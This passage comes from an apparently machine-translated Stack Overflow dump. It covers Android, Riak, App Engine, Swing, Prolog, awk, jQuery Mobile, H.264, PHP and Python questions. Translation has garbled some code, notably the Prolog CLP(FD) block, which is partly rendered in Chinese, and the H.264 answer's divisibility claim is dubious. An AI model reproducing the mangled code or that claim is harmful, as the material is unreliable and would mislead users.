12-14 00:06:39.906: E/AndroidRuntime(668):  at dalvik.system.NativeStart.main(Native Method)

12-14 00:06:39.906: E/AndroidRuntime(668): Caused by: android.view.InflateException: Binary XML file line #8: Error inflating class android.support.v7.widget.Space

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:691)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.view.LayoutInflater.rInflate(LayoutInflater.java:739)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.view.LayoutInflater.inflate(LayoutInflater.java:489)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.view.LayoutInflater.inflate(LayoutInflater.java:396)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.view.LayoutInflater.inflate(LayoutInflater.java:352)

12-14 00:06:39.906: E/AndroidRuntime(668):  at com.android.internal.policy.impl.PhoneWindow.setContentView(PhoneWindow.java:251)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.app.Activity.setContentView(Activity.java:1835)

12-14 00:06:39.906: E/AndroidRuntime(668):  at xxxxname.xnamepre.xnamepre2012.SplashScreen.onCreate(SplashScreen.java:30)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.app.Activity.performCreate(Activity.java:4465)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)

12-14 00:06:39.906: E/AndroidRuntime(668):  ... 11 more

12-14 00:06:39.906: E/AndroidRuntime(668): Caused by: java.lang.ClassNotFoundException: 
android.support.v7.widget.Space

12-14 00:06:39.906: E/AndroidRuntime(668):  at dalvik.system.BaseDexClassLoader.findClass(BaseDexClassLoader.java:61)

12-14 00:06:39.906: E/AndroidRuntime(668):  at java.lang.ClassLoader.loadClass(ClassLoader.java:501)

12-14 00:06:39.906: E/AndroidRuntime(668):  at java.lang.ClassLoader.loadClass(ClassLoader.java:461)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.view.LayoutInflater.createView(LayoutInflater.java:552)

12-14 00:06:39.906: E/AndroidRuntime(668):  at android.view.LayoutInflater.createViewFromTag(LayoutInflater.java:680)

12-14 00:06:39.906: E/AndroidRuntime(668):  ... 21 more 
```

在线 SplashScreen.java:30 代表`setContentView(R.layout.splashscreen);`我没有触及这些文件。在`res/layout`文件夹中是 splashscreen.xml 文件。

另外，如何将虚拟 Android 设备管理器的迷你图标添加回我的工具栏？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T04:16:49.923

android sdk 目前只支持 jdk 1.6。此外，您可以在此处找到有关安装 eclipse 的 adt 插件的说明：http: [//developer.android.com/tools/sdk/eclipse-adt.html](http://developer.android.com/tools/sdk/eclipse-adt.html)

# concurrency - Riak - 并发 Erlang Map/Reduce 作业

> ID：13870973
> 
> 赞同：0
> 
> 时间：2012-12-14T00:33:28.730
> 
> 标签：concurrency, erlang, mapreduce, virtual-machine, riak

我在[Riak](http://docs.basho.com/riak/latest/)上运行 Erlang Map/Reduce 作业。

过去当我使用 Javascript M/R 作业时，我必须正确调整 JS VM 设置。当时我发现这个对话非常有用：到[http://riak-users.197444.n3.nabble.com/Follow-up-Riak-Map-Reduce-error-preflist-exhausted-td4024330.html](http://riak-users.197444.n3.nabble.com/Follow-up-Riak-Map-Reduce-error-preflist-exhausted-td4024330.html)

现在，因为我不是 Erlang 开发人员，所以我想知道在 Riak 上运行并发 M/R 作业时的主要含义是什么，以及是否需要设置任何 VM 设置（就像我过去对 JS M/R 所做的那样）。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T07:41:44.333

目前我们发现了这个 riak mapred 陷阱：

*   [worker_limit_reached](https://github.com/basho/riak_kv/issues/290)。当您有大量数据到达映射作业且作业队列已满时，就会发生这种情况
*   读取 r=1。使用 r=1 读取 mapreduce 中的所有数据
*   没有读修复。Mapreduce 读取不会触发[读取修复](http://riak-users.197444.n3.nabble.com/read-repair-and-map-reduce-td4025919.html)
*   你可能会得到已经删除的数据。在mapred里面检查object的特殊头，表示object已经被删除

ps这是关于riak 1.2.1的。Basho 的人很快解决了许多问题，所以它可能会在不久的将来改变。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-14T03:38:51.747

基本上这里发生的是 map/reduce 查询的所有阶段都是由 ErlangVM 执行的，而不是由 Erlang+JS 执行的。由于作业在 ErlangVM 中被隔离在不同的进程中，因此操作不受影响。就主机而言，您具有相同的计算能力，因此也可以。关于 ErlangVM 参数，其中许多参数经过调整以改进 Riak 操作，您的查询很好。

# python - ApplicationError: 7 当处理完成后，mapreduce worker 写入 Google Cloud Storage

> ID：13870975
> 
> 赞同：5
> 
> 时间：2012-12-14T00:34:01.810
> 
> 标签：python, google-app-engine, mapreduce, google-cloud-storage, mapper

刚刚完成一项大型 Appengine mapreduce 任务，我的许多分片都在终点线被卡住了。这是设置：

```
 filenames = yield mapreduce_pipeline.MapperPipeline(
            'example mapper name',
            'main.MyMapper',
            input_reader_spec='mapreduce.input_readers.DatastoreInputReader',
            output_writer_spec='mapreduce.output_writers.FileOutputWriter',
            params={
                'input_reader':{
                    'entity_kind':'models.MyModel'
                },
                'output_writer':{
                    'filesystem':'gs',
                    'mime_type':'text/csv',
                    'gs_bucket_name':'myBucket',
                    'output_sharding':'input'
                }
            },
            shards=DUMP_SHARDS
            ) 
```

我正在并行运行其中的 3 个，每个都有 16 个分片。一个映射器顺利完成，另外两个映射器在他们的 14 个和 9 个分片上都取得了成功。

剩下的碎片全部被石墙完全封印，回归`UnknownError: ApplicationError: 7`。（本文末尾的完整堆栈跟踪。）

请注意，映射器正在尝试写入**Google Cloud Storage**。错误发生在执行此写入的位中。

在寻找了一段时间后，我发现在[google.appengine.runtime.apiproxy](http://code.google.com/p/googleappengine/source/browse/trunk/python/google/appengine/runtime/apiproxy.py)（这似乎是有问题的代理）中，错误 7 是`OTHER_ERROR`.

我已经重试了这些最终任务（来自任务队列）大约 3 个小时，自从这些错误开始以来没有一个成功；无论发生什么，它都完全卡住了。我也尝试停止所有正在运行的实例，以防这是一些奇怪的本地状态，但没有改变......

这是完整的堆栈跟踪：

```
I 2012-12-13 15:40:23.909
Processing done for shard 14 of job '1582444192075C233F6AA'
E 2012-12-13 15:40:23.969
ApplicationError: 7 
Traceback (most recent call last):
  File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 1511, in __call__
    rv = self.handle_exception(request, response, e)
  File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 1505, in __call__
    rv = self.router.dispatch(request, response)
  File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 1253, in default_dispatcher
    return route.handler_adapter(request, response)
  File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 1077, in __call__
    return handler.dispatch()
  File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 547, in dispatch
    return self.handle_exception(e, self.app.debug)
  File "/base/python27_runtime/python27_lib/versions/third_party/webapp2-2.3/webapp2.py", line 545, in dispatch
    return method(*args, **kwargs)
  File "/base/data/home/apps/myserver/myinstance.363844686987482417/mapreduce/base_handler.py", line 65, in post
    self.handle()
  File "/base/data/home/apps/myserver/myinstance.363844686987482417/mapreduce/handlers.py", line 231, in handle
    tstate.output_writer.finalize(ctx, shard_state.shard_number)
  File "/base/data/home/apps/myserver/myinstance.363844686987482417/mapreduce/output_writers.py", line 631, in finalize
    files.finalize(self._filename)
  File "/base/data/home/apps/myserver/myinstance.363844686987482417/mapreduce/lib/files/file.py", line 568, in finalize
    f.close(finalize=True)
  File "/base/data/home/apps/myserver/myinstance.363844686987482417/mapreduce/lib/files/file.py", line 291, in close
    self._make_rpc_call_with_retry('Close', request, response)
  File "/base/data/home/apps/myserver/myinstance.363844686987482417/mapreduce/lib/files/file.py", line 427, in _make_rpc_call_with_retry
    _make_call(method, request, response)
  File "/base/data/home/apps/myserver/myinstance.363844686987482417/mapreduce/lib/files/file.py", line 252, in _make_call
    _raise_app_error(e)
  File "/base/data/home/apps/myserver/myinstance.363844686987482417/mapreduce/lib/files/file.py", line 186, in _raise_app_error
    raise UnknownError(e)
UnknownError: ApplicationError: 7 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-03T14:12:26.997

我刚刚有一个类似的问题。我认为这是专门写给 Google Cloud Storage 问题的。

我在这里获得了一些见解：[Google App Engine 问题：8775](https://code.google.com/p/googleappengine/issues/detail?id=8775)

摘要（TLDR）：

*   可能是一次性网络问题。
*   可能是计费问题。
*   结果：如果它没有消失并且修复账单不起作用，请联系 Google 支持。

# java - 正确更新摆动组件？

> ID：13870982
> 
> 赞同：6
> 
> 时间：2012-12-14T00:35:02.603
> 
> 标签：java, swing, concurrency, timer, event-dispatching

我是摇摆新手，任何帮助表示赞赏。

在这段代码中，我将一张卡片正面朝上翻转，如果事实证明它们不匹配，我希望它们再次正面朝下翻转。

目前正在发生的事情： 1\. 当点击第一张卡片时 2\. 当点击第二张卡片时，会发生两件事中的任何一个（a）如果它们相同，它们都会保持不变，这就是我想要的（b）如果它们不一样我根本看不到第二张卡片，因为它会立即重新显示卡片的背面（以及前一张卡片的背面也是我的方法中定义的）。

我认为放入睡眠计时器可能会使第二张卡片显示一段时间，然后再翻身，但事实并非如此。

我试图使用 contentPane.revalidate(); & contentPane.repaint(); 但它不会改变任何东西。

我已经输入了一些控制台输出：

```
Console output:
Card: 0 set
Card: 6 set
Sleeping now
Card: 6 unset
Card: 0 unset 
```

上面是单击两张不匹配的卡时产生的控制台输出

```
@Override
public void actionPerformed(ActionEvent e) 
{
    String buttonPressed = e.getActionCommand();
    int pos = Integer.valueOf(buttonPressed);
    action = Control.model.ReceiveCardsTurned(pos);

    keypadArray[pos].setIcon(myIcons[pos]);     
    System.out.println("Card: "+pos+" set");
    currentTime.setText("" + Control.model.time);
    currentScore.setText("" + Control.model.score);

    //contentPane.revalidate();
    //contentPane.repaint();        

    if(Control.model.twoCardsTurned == false)
    {
        if (action == "unturn") 
        {
            System.out.println("Sleeping now");

            try 
            {
                Thread.sleep(1000);
            }

            catch (InterruptedException e1) 
            {
                e1.printStackTrace();
            }

            keypadArray[pos].setIcon(back);
            keypadArray[Control.model.lastCard].setIcon(back);
            System.out.println("Card: "+pos+" unset");
            System.out.println("Card: "+Control.model.lastCard+" unset");
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-14T00:44:20.697

您不能在事件调度线程中休眠，因为您的 GUI 将冻结。你必须使用[Swing Timer](http://docs.oracle.com/javase/tutorial/uiswing/misc/timer.html)。对于您将来可能不得不担心的后台任务，请查看[SwingWorker](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/index.html)。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-14T00:53:37.847

您似乎遗漏了许多重要的概念。

1.  Swing 是一个事件驱动的环境。这意味着没有任何方法（或至少只有极少数）可以“等待”用户输入，通常，您只需要对他们的交互做出反应。
2.  Swing 由单个线程驱动，称为事件调度线程 (AKA EDT)。该线程负责将进入应用程序的事件分派/处理到应用程序的适当部分，以便它们可以采取行动。
3.  重绘管理器将其更新请求发布到 EDT。

您采取的任何阻止 EDT 执行此工作的操作都会使您的应用程序看起来像挂起一样。

您绝不能在 EDT 上执行任何耗时的操作（例如 I/O、循环或`Thread#sleep`例如），这样做会使您的应用程序“暂停”，这永远不会很漂亮。

阅读[Swing 中的并发以](http://docs.oracle.com/javase/tutorial/uiswing/concurrency/index.html)获取更多信息。

现在，您有多种选择。您可以使用 a`Thread`在后台“等待”并将卡片转回，或者您可以使用 a`SwingWorker`或 a `javax.swing.Timer`。

您遇到的另一个问题是，您永远不应该从`Thread`EDT 以外的任何地方更新任何 UI 组件。这意味着如果您使用 a `Thread`，您将负责将该线程与 EDT 重新同步。虽然不难，但它只是变得混乱。

`SwingWorker`并`javax.swing.Timer`具有使这更容易的功能。

线程并且`SwingWorker`非常适合执行后台处理，并且对于这个问题来说只是矫枉过正。相反， a`javax.swing.Timer`非常适合这里。

```
if (!Control.model.twoCardsTurned)
    {
        if ("unturn".equals(action)) 
        {
            new Timer(1000, new ActionListener() {
                public void actionPerformed(ActionEvent evt) {
                    keypadArray[pos].setIcon(back);
                    keypadArray[Control.model.lastCard].setIcon(back);
                    System.out.println("Card: "+pos+" unset");
                    System.out.println("Card: "+Control.model.lastCard+" unset");
                }
            }).start();
        }
    } 
```

This is a really simple example. You might like to put in some controls that will prevent the user from clicking anything until the timer fires, for example ;)

# prolog - 如何在 Prolog 中解决密码学难题

> ID：13870983
> 
> 赞同：5
> 
> 时间：2012-12-14T00:35:08.647
> 
> 标签：prolog, clpfd, cryptarithmetic-puzzle

我必须编写一个 Prolog 程序来解决一个密码难题。

我需要编写一个函数 solve([A, M, P, D, Y]) 将变量 [A, M, P, D, Y] 分配给从 0 到 9 的值，以便满足等式 AM+PM =天。每个变量被赋予不同的值，A、P、D 不能等于 0。

我开始编写这个函数，但是在运行我的程序时遇到了问题。我将 A、P 和 D 的限制设置为不为零。当我浏览算法时，我意识到 D 必须为 1，所以我在程序的开头定义了它。我为 M 定义了两个不同的变量（M1 和 M2）并将它们设置为彼此相等，因为拼图中的不同 M 应该分配给相同的值。我将位置分配给不同的变量，并根据谜题将它们相加。我解释了任何变量携带进位变量。我的程序编译但函数没有执行。

```
solve([A, M1, M2, P, D, Y]):- D is 1,
A/=0,
P/=0,
D/=0,
M1 = M2,
select(M1, [0,2,3,4,5,6,7,8,9], R1),
select(M2, R1, R2),
Y is (M1+M2) mod 10,
C1 is (M1+M2) // 10,
select(Y, R2, R3),
select(A, R3, R4),
select(P, R4, R5),
select(D, R5, R6),
A is (A+P+C1) mod 10,
D is (A+P+C1)// 10. 
```

我究竟做错了什么？我的变量定义有问题吗？我需要定义两个不同的 M 变量，还是一个就足够了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-14T00:59:29.563

这是我为您解决难题的解决方案。我们只是依靠 PROLOG 的回溯。我们首先选择所有变量，然后检查拼图条件。我认为您不需要定义两个女士。

```
solve([A,M,P,D,Y]):- 
select(A,[0,1,2,3,4,5,6,7,8,9],WA), % W means Without
not(A=0),
select(M,WA,WMA),
select(P,WMA,WMAP),
not(P=0),
select(D,WMAP,WMAPD),
not(D=0),
select(Y,WMAPD,WMAPDY),
DAY is 100*D+10*A+Y,
AM  is 10*A+M,
PM  is 10*P+M,
DAY is AM+PM. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-16T11:04:55.603

你写：“我的程序编译但函数没有执行：”

```
solve([A, M1, M2, P, D, Y]):- D is 1,
    A/=0, 
```

难怪。首先，`/=`Prolog 中没有运算符。我假设你的意思是`\=`. 但是`A \= B`意味着“A不能与B统一”。在你的情况下`B`是 0，但`A`它是一个尚未设置的逻辑变量。它可以与*任何东西*统一。在所有涉及的 logvar 都已实例化*之后*，您应该只用于`\=`检查*不等式*！

 *所以，`A \= 0` ***失败了***。（另一件事是，`M1=M2`是多余的，您可以`M`始终使用）。

解决此类难题的通用工具是[从缩小域中进行独特选择](https://stackoverflow.com/a/11011680/849891)：

```
selectM([A|As],S,Z):- select(A,S,S1),selectM(As,S1,Z).
selectM([],Z,Z). 
```

有了它，你的谜题就

```
solve([A,M,P,D,Y]):-
  selectM([A,P,D],[1,2,3,4,5,6,7,8,9],R),     % R is the remaining domain
  selectM([M,Y],[0|R],_),                     % don't care what remains
  10*(A+P)+M+M =:= 100*D+10*A+Y. 
```

* * *

您有一个正确的想法，即在可能的情况下在搜索之前找出分配。使用您的方法，它可以写成

```
solve([A,M,P,D,Y]):-    
  selectM([M,A],[0,1,2,3,4,5,6,7,8,9],R),
  A =\= 0,
  Y  is (M+M) mod 10,     % AM+PM=DAY
  C1 is (M+M) // 10,
  A  is (A+P+C1) mod 10,
  D  is (A+P+C1) // 10,
  selectM([P,D,Y],R,_),   % ensure all are different
  p =\= 0, D =\= 0. 
```

同样，我们*必须*`A`在测试其值之前进行选择。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-10-01T06:15:40.473

除了其他人发布的内容之外，我想提出一个稍微不同的看法。

以下解决方案使用 GNU Prolog 及其**CLP(FD)**约束。这种约束在所有广泛使用的 Prolog 系统中都可用。

```
解决方案（Vs）： -
        Vs = [A,M,P,D,Y],
        fd_domain(Vs, 0, 9),
                   A*10 + M
                 + P*10 + M
        #= D*100 + A*10 + Y,
        fd_all_different(Vs),
        一个#\= 0，
        P #\= 0,
        D #\= 0。

```

我现在强调在这种情况下使用 CLP(FD) 约束的几个**关键优势**。

首先，很明显，我们可以在具有这些约束的情况下以极其**直接的方式对所有需求进行建模。**该程序实际上是您的任务到内置关系的几乎逐字翻译：

*   > 我需要编写一个函数solve([A, M, P, D, Y])

    我使用`solution/1`了命令而不是命令`solve/1`，因为**谓词在***所有方向*上都有意义，包括所有变量已经**绑定**到具体整数的特定实例。在这种情况下，我们可以使用谓词来**验证**解决方案。在难题已经完全解决的情况下，称其为“解决”是没有意义的。此外，我们可以使用谓词来*完成*部分实例化的解决方案。*在 Prolog 中，避免*谓词名称的必要性是一种很好的做法。

*   > 它将变量 [A, M, P, D, Y] 分配给从 0 到 9 的值

    这是通过`fd_domain(Vs, 0, 9)`.

*   > 从而满足等式AM+PM=DAY。

    因此方程为`A*10 + M + P*10 + M #= D*100 + A*10 + Y`。

*   > 每个变量都被赋予不同的值

    这由内置约束表示`fd_all_different/1`。

*   > 并且 A、P 和 D 不能等于 0。

    这是通过`A #\= 0`等说明的。

其次，我们可以使用最通用的查询来研究**约束传播**的影响：

```
| ？- 解决方案（[）。

VS = [_#3(2..8),_#24(5..8),9,1,_#87(0:2..6)]

```

或者，换一种说法：

```
| ?- 解决方案（[A,M,P,D,Y]）。

A = _#3(2..8)
D = 1
M = _#24(5..8)
P = 9
Y = _#87(0:2..6)

```

这证实了你所说的：在这个难题`D`中*必然是 1。*这也显示了超出您发现的其他一些有趣的事情：*必然*`P`是 9。此外，非常严格的界限适用于 ，并且 的域也 被显着修剪。*`M``A``Y`*

 *这表明约束传播显着**减少**了搜索空间。

具体的解决方案是什么样的？这里有一些例子：

```
| ?- 解决方案（Vs），fd_labeling（Vs）。

VS = [2,5,9,1,0]？;

VS = [2,7,9,1,4]？;

VS = [2,8,9,1,6]？

是的

```

第三，您可以运行不同的**标记选项**来尝试各种搜索策略来探索解决方案空间，*而*无需更改或重新编译程序。

最后，显着减少的搜索空间通常会产生**更快的**程序。我把它作为一个练习来运行一些基准测试，以显示在这种情况下基于 CLP(FD) 的版本有多快。

有关这个重要的声明范式的更多信息，请参阅**[clpfd](/questions/tagged/clpfd "显示标记为“clpfd”的问题")**。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-14T06:36:28.057

我认为您的问题是对 D 的多个“分配”。首先 D 绑定到 1，之后无法更改值（Prolog 使用统一，而不是分配）。然后两者

```
...
select(D, R5, R6),
...
D is (A+P+C1)// 10. 
```

当 D 不等于 1 时将失败**

# unix - UNIX：比较 2 个文件并附加重复项 - 几乎可以正常工作

> ID：13870984
> 
> 赞同：0
> 
> 时间：2012-12-14T00:35:42.157
> 
> 标签：unix, awk, comparison, grep, duplicates

我正在编写一个 Unix 脚本，我必须在其中比较 2 个文件。一个文件是 ID 列表（ids.txt，另一个是重复 ID 列表（duplicate.txt）。我需要比较这两个文件并为在 ids.txt 中找到的每个重复项添加一个计数系统。我已经创建了重复文件和ID文件，我只需要比较它们并在重复的末尾添加数字。到目前为止我已经尝试过：

```
awk 'FILENAME=="duplicates.txt" {arr[$0]++}
 FILENAME=="ids.txt" {print $0, arr[$0]} ' duplicates.txt ids.txt 
```

这几乎可行，唯一的问题是所有重复项都在末尾附加了 1，但我需要它来计算每个重复项。例如，如果我在文件中有 dabbott 3 次，我需要它说 dabbott1 dabbott2 dabbott3。提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T04:18:32.440

使用您的脚本作为基础：

```
awk 'FILENAME=="duplicates.txt" {arr[$0]++}
     FILENAME=="ids.txt"        { if (arr[$0]) printf "%s%d\n", $0, ++cnt[$0];
                                  else print
                                }' \
     duplicates.txt ids.txt 
```

您在重复到达时对它们进行计数/记录，以便知道哪些行是重复的。重复文件是否列出重复名称一次或多次并不重要；两者都会好的。

第二个循环记录当前行是否在重复列表中；如果是这样，它会打印该行后跟一个预先递增的计数器（因此给定副本的第一次出现以 1 作为后缀）；否则，该行将按原样打印。

`FILENAME = "filename"`您可以辩论vs的优点`FNR == NR`来区分这两个文件；最终结果是相同的，因此您也可以尝试：

```
awk 'FNR == NR { arr[$0]++; next }
               { if (arr[$0]) printf "%s%d\n", $0, ++cnt[$0];
                 else print }' duplicates.txt ids.txt 
```

请注意，`print`如果您希望在和`dabbot1`之间没有空格，则使用不可行。如果空格无关紧要并且您总是想要一个后缀（如果没有重复则为 0），您可以只写而不是with 。`dabbot``1``printf $0, ++cnt[$0]``if``printf`

如果你使用这个`FNR == NR`技巧，你甚至不需要预先准备重复文件；你可以简单地使用：

```
awk 'FNR == NR { arr[$0]++; next }
               { if (arr[$0] > 1) printf "%s%d\n", $0, ++cnt[$0];
                 else print }' ids.txt ids.txt 
```

第一次通过文件，它通过计数来整理出哪些记录是重复的。第二次通过文件，它知道哪些是重复的（计数`arr`超过`1`）并且可以在这些行上打印后缀。

# jquery-mobile - 在自定义跨度 jQuery Mobile 滑块标签上设置字体

> ID：13870987
> 
> 赞同：1
> 
> 时间：2012-12-14T00:35:58.243
> 
> 标签：jquery-mobile, slider, jquery-ui-slider

你好善良的互联网人，

我在 jQuery Mobile 范围滑块的左侧和右侧添加一些文本内容作为标签，这工作正常，但我似乎无法让字体表现...字体显示不正确，而且我似乎无法在跨度内设置/重置标签字体。

这是一个测试页面： [http ://www.simdock.com/amort-test/dev-scratch/amort/scratchtesting-Slider-label-font-issue.html](http://www.simdock.com/amort-test/dev-scratch/amort/scratchtesting-Slider-label-font-issue.html)

这是在滑块左侧和右侧放置自定义滑块标签（最小和最大滑块范围值）的 javascript 代码：

```
 $.fn.extend({
 sliderLabels: function(left,right) {
 var $this = $(this); 
 var $sliderdiv= $this.next("div.ui-slider[role='application']");
 //
 $sliderdiv
 .prepend('<span class="ui-slider-inner-label" style="position: absolute; left:0px; top:20px;">'+left+ '</span>')
 .append('<span class="ui-slider-inner-label" style="position: absolute; right:0px; bottom:20px;">'+right+ '</span>');     
  //   
 }
 });
 //
 $('#slider-PrincipleAmnt').sliderLabels('Min: $20', 'Max: $999'); 
```

我尝试了许多不同的迭代并尝试在跨度中显式设置字体，但可惜，没有运气。

我在以下链接的 jquery 论坛上找到了最初的代码： [https ://forum.jquery.com/topic/how-do-i-add-text-labels-below-slider](https://forum.jquery.com/topic/how-do-i-add-text-labels-below-slider)

上面的链接也有一个jsfiddle，字体很好......所以我只是不明白我忽略了什么。 [http://jsfiddle.net/cUNyr/1/](http://jsfiddle.net/cUNyr/1/)

任何帮助或建议将不胜感激。

更新说明：Jack 和 Taifun 都提供了一些非常有用的提示和想法，但是，我仍然在纠结到底要修改什么以及如何修改 CSS？我也对我什至如何能够确定文本字体甚至首先有一个“阴影”感到困惑/沮丧？...这是 Firebug 中所示的 span CSS：

```
<span class="ui-slider-inner-label" style="position: absolute; left:0px; top:20px;">Min: $20</span> 
```

Firebug 中没有显示“文本阴影”属性。Soooo，嗯，我在找什么？用什么工具？“文字阴影”从何而来？CSS override 会是什么？

在这一点上，奇数球字体是如何出现的，以及如何修复它仍然是一个谜……但我确信有一个重要的教训需要学习（禅宗的事情：重视你的错误）下次我遇到类似的情况。再说一遍：你们会非常乐于助人……我觉得我已经接近解决这个问题了……但是，唉，还没有。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T14:32:01.787

在您使用的示例中`data-theme="b" data-track-theme="a"`。删除你得到一个可读的字体。但是，如果您喜欢使用该主题，您可以像@Jack 提到的那样覆盖 CSS，更多信息[在这里](http://jquerymobile.com/demos/1.2.0/docs/api/themes.html)。

> **压倒一切的主题**
> 
> 主题旨在作为一个坚实的起点，但旨在定制。由于一切都由 CSS 控制，因此可以很容易地使用 Web 检查器工具来识别您要修改的样式属性。

**另见[工作示例](http://jsfiddle.net/ZqBmE/)**

**编辑**：无需创建外部自定义 CSS 文件....您可以将其添加到`<style>`html 的头部以覆盖您的 CSS，另请参见此**[小提琴](http://jsfiddle.net/Q4GY8/)**

```
<style>
   .ui-slider-inner-label {
     text-shadow:none;
     color:black;
     font-weight:normal;
   }
</style> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-15T22:20:45.827

再次注意 Jack 和 Taifun 提供的提示最有帮助......但我终于找到了一种直接简单的方法来解决这个问题，直接将 text-shadow 设置为 none，然后强制文本为黑色（仍然显示在白色），然后变为普通字体（以粗体显示）。因此，虽然我没有确定到底是什么导致了阴影文本，但我确实设法至少使用内联技术将其重置为常规字体，并避免创建外部自定义 CSS 文件。

```
 //
  $sliderdiv
  .prepend('<span class="ui-slider-inner-label" style="position: absolute; left:0px; top:20px; text-shadow:none; color:black; font-weight:normal">'+left+ '</span>')
  .append('<span class="ui-slider-inner-label" style="position: absolute; right:0px; bottom:20px; text-shadow:none; color:black; font-weight:normal">'+right+ '</span>');      
  // 
```

# c - H.264 1080p 编码

> ID：13870988
> 
> 赞同：2
> 
> 时间：2012-12-14T00:35:59.490
> 
> 标签：c, encoding, h.264, rtsp

我正在开发 H264 数据的 RTSP 流，但我认为 H264 需要具有始终可被 16 整除的分辨率。1920 是但 1080 不能被 16 整除，h264 如何与它一起工作，你是否需要额外填充几行能被16整除吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-14T01:46:17.947

是的，*最大*的宏块是 16x16。但它也支持 VBMSC（可变块大小运动补偿），允许 4x4 和 16x16 之间的任何宏块大小，增量为 4（16×8、8×16、8×8、8×4、4×8）。

所以framesize只需要能被4整除。

# php - 使用两个选择查询创建一个多维数组？有没有更好的办法？

> ID：13870994
> 
> 赞同：0
> 
> 时间：2012-12-14T00:36:41.667
> 
> 标签：php, multidimensional-array, foreach

我正在尝试用专辑及其各自的歌曲制作一个简单的曲目管理器。我有两张桌子，一张用于专辑，一张用于歌曲，如下所示：

```
 albums:
    id | title        | artfile | artmime | 
    1    Dilla Jams     222222    .png
    2    Madlib Jams    333333    .png
    songs
    id | title    | trackfile | trackmime | albumid
    1    Streets    121212      .mp3        1
    2    Mash       343434      .mp3        1
    3    Accoridan  545454      .mp3        2 
```

我一直在尝试创建一个可以通过 foreach() 看起来像这样的数组：

```
Array ( 
 [0] => Array 
   ( [id] => 1 [title] => Dilla Jams [artfile] => 222222 [artmim] => .png
     [songs] => Array ([0] => Array 
                    ([id] => 1 [trackfile] => 121212 [trackmime] => .mp3 [albumid] => 1) 
                       [1] => Array 
                          ([id] => 2 [trackfile] => 343434 [trackmime] => .mp3 [albumid] => 1))) 

   [1] => Array
          ( [id] => 2 [title] => Madlib Jams [artfile] => 333333 [artmim] => .png
            [songs] => Array ([0] => Array 
                          ([id] => 3 [trackfile] => 545454 [trackmime] => .mp3 [albumid] => 2)))) 
```

我使用 PHP 数据库对象尝试了以下操作：

```
try{
$s = $pdo->query('SELECT id, title, artfile, artmime FROM album GROUP BY id DESC');
} 
catch (PDOExceptin $e) {/*catch statement here */}

$songs = array();
$result = $s->fetchAll();
foreach ($result as $info)
{
$album[] = array('id' => $info['id'],
                 'title' => $info['title'],
                 'artfile' => $info['artfile'],
                 'artmime' => $info['artmime'],
                 'tracklist' => $songs
                 );
try{
$sql = 'SELECT id AS songid, title AS songtitle, trackfile, trackmime, albumid FROM    songs WHERE albumid = :id';
$s = $pdo->prepare($sql);
$s->bindValue(':id', $info['id']);
$s->execute();
}
catch (PDOExceptin $e) {/*catch statement here */}

foreach ($s as $sng)
{
 $sngs[] = array('songid' => $sng['songid'],
       'songtitle' => $sng['songtitle'],
       'filename' => $sng['trackfile'],
       'mimetype' => $sng['trackmime'],
       'albumid' => $sng['albumid'],
            );
 }

 array_push($songs, $sngs);

 } //end initial for each loop on album table query results 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-14T00:41:01.400

使用 SELECT ... LEFT JOIN 从数据库中获取结果，然后迭代结果以生成数组

# python - 用值列表替换字符串中的占位符的简单方法？

> ID：13870996
> 
> 赞同：2
> 
> 时间：2012-12-14T00:36:44.917
> 
> 标签：python

我有一个包含占位符的长字符串，应该用一些数据替换。

```
strOut = "text text {{ }} text text {{ }}" 
```

用这种模式

```
pattern = r'\{{(.+?)\}}' 
```

我很容易做这样的事情

```
pattern.sub(self.mymethod, strOut) 
```

将调用 mymethod 进行替换的地方。它实际上工作得很好。然而，这就是现在的问题。我需要用列表中的值替换字符串中的所有占位符。例如，这又是一个字符串：

```
strOut = "text text {{ }} text {{ }} text" 
```

它总是有不确定数量的占位符。如果我还有一个让我们说 2 个值的列表

```
myList = [2, 3] 
```

我需要一种将这些值注入占位符的方法，并最终得到这个

```
"text text 2 text 3 text" 
```

列表中的值的数量和占位符的数量总是相同的，我只是事先不知道会有多少。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2016-02-03T18:04:00.803

```
my_csv = '%(first)s,%(last)s'
print my_csv % dict(last='Doe', first='John')  # John,Doe 
```

我喜欢这个，原因如下：

*   不再需要值的排序
*   可以一次性替换多个占位符。

灵感来自[https://stackoverflow.com/a/11023271/2147228](https://stackoverflow.com/a/11023271/2147228)

* * *

## 回答 #2

> 赞同：3
> 
